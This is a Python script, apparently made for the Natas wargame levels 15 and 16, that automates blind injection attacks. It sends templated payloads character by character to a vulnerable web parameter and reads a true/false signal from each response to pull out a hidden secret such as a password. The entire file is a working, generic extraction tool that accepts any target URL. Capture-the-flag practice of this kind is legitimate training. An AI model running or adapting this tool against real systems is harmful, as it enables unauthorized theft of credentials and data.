#!/usr/bin/env python3
import argparse
import requests
import string
import time


def parse_args():
    p = argparse.ArgumentParser(description="Generic blind extractor (template + oracle)")

    p.add_argument("--url", required=True, help="Target URL (e.g., http://natas16.../)")
    p.add_argument("--user", required=True, help="HTTP auth username")
    p.add_argument("--password", required=True, help="HTTP auth password")
    p.add_argument("--param", required=True, help="Vulnerable parameter name (e.g., username, needle)")
    p.add_argument("--payload-template", required=True, help='Template using {char} and/or {pos}')
    p.add_argument("--max-length", type=int, default=32, help="Max length to extract")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds)")

    # Oracle / detection
    p.add_argument(
        "--mode",
        choices=["contains", "pre-empty", "pre-nonempty"],
        default="contains",
        help=(
            "contains: TRUE if --true-string appears in response (Natas 15)\n"
            "pre-empty: TRUE if <pre> output is empty (Natas 16 style)\n"
            "pre-nonempty: TRUE if <pre> output is non-empty"
        ),
    )
    p.add_argument("--true-string", default="", help="Used only in --mode contains")
    p.add_argument("--pre-start", default="<pre>", help="Start marker for output extraction")
    p.add_argument("--pre-end", default="</pre>", help="End marker for output extraction")

    # Charset control
    p.add_argument(
        "--charset",
        default=string.ascii_letters + string.digits,
        help="Characters to try (default: A-Za-z0-9)",
    )

    return p.parse_args()


def extract_pre_block(html: str, start_marker: str, end_marker: str) -> str:
    """
    Extract the first <pre>...</pre> block content, or empty string if not found.
    """
    start = html.find(start_marker)
    if start == -1:
        return ""
    start += len(start_marker)
    end = html.find(end_marker, start)
    if end == -1:
        return ""
    return html[start:end]


def is_true(resp_text: str, args: argparse.Namespace) -> bool:
    if args.mode == "contains":
        if not args.true_string:
            raise ValueError("--true-string is required when --mode contains")
        return args.true_string in resp_text

    pre = extract_pre_block(resp_text, args.pre_start, args.pre_end).strip()

    if args.mode == "pre-empty":
        return pre == ""
    if args.mode == "pre-nonempty":
        return pre != ""

    return False  # unreachable


def request_once(args: argparse.Namespace, payload: str) -> str:
    r = requests.get(
        args.url,
        params={args.param: payload},
        auth=(args.user, args.password),
        timeout=10,
    )
    return r.text


def extract_secret(args: argparse.Namespace) -> str:
    extracted = ""
    charset = args.charset

    print("[*] Starting extraction...\n")

    for pos in range(1, args.max_length + 1):
        found = False

        for ch in charset:
            payload = args.payload_template.format(char=ch, pos=pos)
            text = request_once(args, payload)

            if is_true(text, args):
                extracted += ch
                print(f"[+] Position {pos}: {ch}  ->  {extracted}")
                found = True
                break

            if args.delay:
                time.sleep(args.delay)

        if not found:
            print(f"[!] No character found at position {pos}. Stopping.")
            break

    print("\n[✓] Extraction complete:")
    print(extracted)
    return extracted


def main():
    args = parse_args()
    extract_secret(args)


if __name__ == "__main__":
    main()
